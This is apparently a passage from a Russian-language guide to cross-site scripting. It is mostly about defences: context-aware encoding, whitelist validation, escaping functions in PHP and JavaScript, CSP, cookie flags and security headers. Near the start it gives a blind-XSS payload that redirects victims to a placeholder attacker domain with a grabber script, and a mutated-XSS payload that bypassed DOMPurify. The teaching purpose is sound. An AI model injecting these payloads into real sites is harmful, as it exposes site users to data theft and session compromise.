Использовать перехватчик данных и однострочный HTTP-сервер для подтверждения существования Blind XSS перед развёртыванием тяжёлых инструментов.

**Полезная нагрузка:**

```javascript
<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>
```

**Однострочный HTTP-сервер:**

```bash
ruby -run -ehttpd . -p8080
```

---

# Mutated XSS

Используйте особенности браузеров для воссоздания некоторых HTML-тегов.

**Пример:** Mutated XSS от Масато Кинугавы, использованный против компонента cure53/DOMPurify в Google Search:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

# Защита от XSS

## Кодирование данных при выводе

> Кодирование должно применяться непосредственно перед тем, как данные, контролируемые пользователем, записываются на страницу, потому что контекст, в который вы пишете, определяет, какой тип кодирования вам нужно использовать. Например, значения внутри строки JavaScript требуют другого типа экранирования, чем в HTML-контексте.

### В HTML-контексте

| Символ | Преобразуется в |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |

### В строковом контексте JavaScript

Не буквенно-цифровые значения должны быть экранированы с использованием Unicode:

| Символ | Преобразуется в |
|---|---|
| `<` | `\u003c` |
| `>` | `\u003e` |

### Многоуровневое кодирование

Иногда вам нужно применить несколько уровней кодирования в правильном порядке. Например, чтобы безопасно встроить пользовательский ввод в обработчик событий, нужно работать как с JavaScript-контекстом, так и с HTML-контекстом. Поэтому нужно сначала выполнить Unicode-экранирование ввода, а затем HTML-кодирование:

```html
<a href="#" onclick="x='Эта строка требует два уровня экранирования'">test</a>
```

---

## Валидация ввода при поступлении

| Ситуация | Действие |
|---|---|
| Пользователь отправляет URL, который будет возвращён в ответах | Проверить, что он начинается с безопасного протокола, такого как HTTP или HTTPS. Иначе кто-то может использовать вредоносный протокол, например `javascript:` или `data:`. |
| Пользователь предоставляет значение, которое должно быть числовым | Проверить, что значение действительно содержит целое число. |
| Общий случай | Проверить, что ввод содержит только ожидаемый набор символов. |

### Белый список vs Чёрный список

> Валидация ввода должна использовать **белые списки**, а не чёрные списки. Например, вместо попытки составить список всех вредоносных протоколов (`javascript:`, `data:`, и т.д.), составить список безопасных протоколов (HTTP, HTTPS) и запретить всё, что не входит в список. Это гарантирует, ваша защита не сломается при появлении новых вредоносных протоколов, и делает её менее подверженной атакам, пытающимся обойти чёрный список.

---

## Разрешение "безопасного" HTML

> Классический подход — пытаться фильтровать потенциально опасные теги и JavaScript. Попытаться реализовать это с помощью белого списка безопасных тегов и атрибутов, но из-за различий в движках парсинга браузеров и особенностей, таких как мутированный XSS, этот подход чрезвычайно сложно реализовать безопасно.
>
> Наименее плохой вариант — использовать JavaScript-библиотеку, которая выполняет фильтрацию и кодирование в браузере пользователя, например **DOMPurify**. Другие библиотеки позволяют пользователям предоставлять контент в формате Markdown и конвертировать Markdown в HTML. К сожалению, все эти библиотеки время от времени имеют XSS-уязвимости, поэтому это не идеальное решение.

---

## Как предотвратить XSS с помощью шаблонизаторов

Многие современные веб-сайты используют серверные шаблонизаторы, такие как **Twig** и **Freemarker**, для встраивания динамического контента в HTML. Они обычно определяют свою собственную систему экранирования.

**Пример в Twig:** можно использовать фильтр `e()` с аргументом, определяющим контекст:

```
{{ user.firstname | e('html') }}
```

Некоторые другие шаблонизаторы, такие как **Jinja** и **React**, экранируют динамический контент по умолчанию, что эффективно предотвращает большинство случаев XSS.

---

## Как предотвратить XSS в PHP

> В PHP есть встроенная функция для кодирования сущностей — `htmlentities()`. Необходимо вызывать эту функцию для экранирования ввода в HTML-контексте. Функция должна вызываться с тремя аргументами:

1. Входная строка.
2. `ENT_QUOTES` — флаг, указывающий, что все кавычки должны быть закодированы.
3. Кодировка, в большинстве случаев — `UTF-8`.

**Пример:**

```php
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>
```

### JavaScript-контекст в PHP

В строковом контексте JavaScript, нужно выполнить Unicode-экранирование ввода. К сожалению, PHP не предоставляет API для Unicode-экранирования строки.

```php
<?php
function jsEscape($str) {
    $output = '';
    $str = str_split($str);
    for($i=0;$i<count($str);$i++) {
        $chrNum = ord($str[$i]);
        $chr = $str[$i];
        if($chrNum === 226) {
            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
                    $output .= '\u2028';
                    $i += 2;
                    continue;
                }
                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
                    $output .= '\u2029';
                    $i += 2;
                    continue;
                }
            }
        }
        switch($chr) {
            case "'":
            case '"':
            case "\n";
            case "\r";
            case "&";
            case "\\";
            case "<":
            case ">":
                $output .= sprintf("\\u%04x", $chrNum);
            break;
            default:
                $output .= $str[$i];
            break;
    }
    }
    return $output;
}
?>
```

**Пример использования:**

```php
<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
```

**Альтернатива:** использовать шаблонизатор.

---

## Как предотвратить XSS на клиентской стороне в JavaScript

### HTML-кодирование

Чтобы экранировать пользовательский ввод в HTML-контексте в JavaScript, нужен свой собственный HTML-кодировщик, поскольку JavaScript не предоставляет API для кодирования HTML. 

```javascript
function htmlEncode(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '&#'+c.charCodeAt(0)+';';
    });
}
```

**Использование:**

```javascript
<script>document.body.innerHTML = htmlEncode(untrustedValue)</script>
```

### Unicode-экранирование

Если ввод находится внутри строки JavaScript, нужен кодировщик, выполняющий Unicode-экранирование. 

```javascript
function jsEscape(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```

**Использование:**

```javascript
<script>document.write('<script>x="'+jsEscape(untrustedValue)+'";<\/script>')</script>
```

---

## Как предотвратить XSS в jQuery

jQuery исправила логику селектора, добавив проверку, начинается ли ввод с хэша (`#`). Теперь jQuery будет рендерить HTML только в том случае, если первый символ — `<`. 

---

## Митигация XSS 

### C помощью политики безопасности контента (CSP)

**Пример CSP:**

```
default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
```

Эта политика указывает, что такие ресурсы, как изображения и скрипты, могут загружаться только с того же источника, что и основная страница. Таким образом, даже если злоумышленнику удастся внедрить XSS-полезную нагрузку, он сможет загружать ресурсы только с текущего источника. Это значительно снижает вероятность эксплуатации XSS-уязвимости.
----
### Nonce и хэши

Если требуется загрузка внешних ресурсов, надо убедиться что разрешены только те скрипты, которые не помогают злоумышленнику эксплуатировать сайт. Например, если добавить определённые домены в белый список, злоумышленник может загрузить любой скрипт с этих доменов. По возможности надо размещать ресурсы на своём собственном домене.
----
### Параметры куки

Настройка параметров куки защищает пользователя от их кражи. Вот важные параметры для митигации:

*  `Domain` — определяет, на какой домен или поддомен могут быть отправлены куки. Если параметр не задан, то по умолчанию берётся доменная часть адреса документа — без поддоменов. Если домен указан явно, то поддомены включены.
*  `Secure` — принимает значение true или false. Если значение true, то куки не будет отправляться по незащищённому HTTP-протоколу — это сделано для защиты от атак типа MITM.
*  `Path` — определяет, для какого пути будет отправляться куки. Атрибут указывает URL, который должен быть в запрашиваемом ресурсе на момент отправки заголовка Cookie. Символ / интерпретируется как разделитель в URL-пути, подпути также будут учитываться. Например, если Path=/api, то куки-файл будет отправлен и на /api/faq api/faq/help /api, но не будет отправлен на /api_v2 /web /about/api /market.
*  `SameSite` — используется для отправки куки в междоменных запросах.
*  `Expires` — устанавливает время действия куки. При достижении лимита указанного в Expires куки-файл будет удалён.
*  `HttpOnly` - Если установить параметр HttpOnly для куки, то злоумышленник не сможет получить доступ к куки из JavaScript.
----
### Security Headers

> Security Headers — HTTP-заголовки безопасности. Они сообщают браузеру, как себя вести при общении с сайтом. 

*  `Strict-Transport-Security` — заставляет сайт использовать протокол соединения HTTPS вместо HTTP.
    *  `Strict-Transport-Security`: max-age=<expire-time>; includeSubDomains
    *  `max-age` — указывает время в секундах, в течение которого содержимое заголовка будет храниться в кеше браузера.
    *  `includeSubDomains` — если указан этот параметр, правило применяется ко всем поддоменам. 
*  `X-Content-Type-Options` — гарантирует, что типы MIME, установленные приложением, будут соблюдаться браузерами.
    *  `X-Content-Type-Options: nosniff` указывает браузеру, что не нужно изменять Content-Type загружаемых файлов. 
Например, если на страницу загружается файл script.txt MIME-типа text/plain, то браузер попробует угадать его тип. Браузер выставит ему исполняемый тип, и он исполнится. Но если указать nosniff, то браузер будет прямо следовать Content-Type.
*  `X-Frame-Options` — определяет, можно ли другим сайтам подгружать целевой сайт в iframe, если директива не указана, то сайт можно подгрузить в iframe.
    *  `X-Frame-Options: DENY` — страница не может отображаться во фрейме, независимо от того, какой сайт пытается это сделать.
    *  `X-Frame-Options: SAMEORIGIN` — страница может отображаться только в том случае, если родительская страница имеет тот же Origin, что и сама страница. 
    *  `X-Frame-Options: ALLOW-FROM origin` — устаревшая директива. Использование этого параметра приведёт к такому же поведению, что и его отсутствие. 
*  `X-XSS-Protection` — указывает браузерам приостановить выполнение обнаруженных XSS-атак.
    *  `X-XSS-Protection: 0` — отключить защиту от XSS.
    *  `X-XSS-Protection: 1` — включить фильтрацию XSS и удалить небезопасную часть.
    *  `X-XSS-Protection: 1; mode=block` — браузер предотвращает отображение всей страницы при обнаружении XSS.
    *  `X-XSS-Protection: 1; report=<reporting-uri>` — включить фильтрацию XSS и удаление небезопасной части, затем сообщить о нарушении по reporting-uri. 

# Ссылки

- [XSS Payloads List](http://www.xss-payloads.com/payloads-list.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [XSS in hidden fields](https://portswigger.net/research/xss-in-hidden-input-fields)
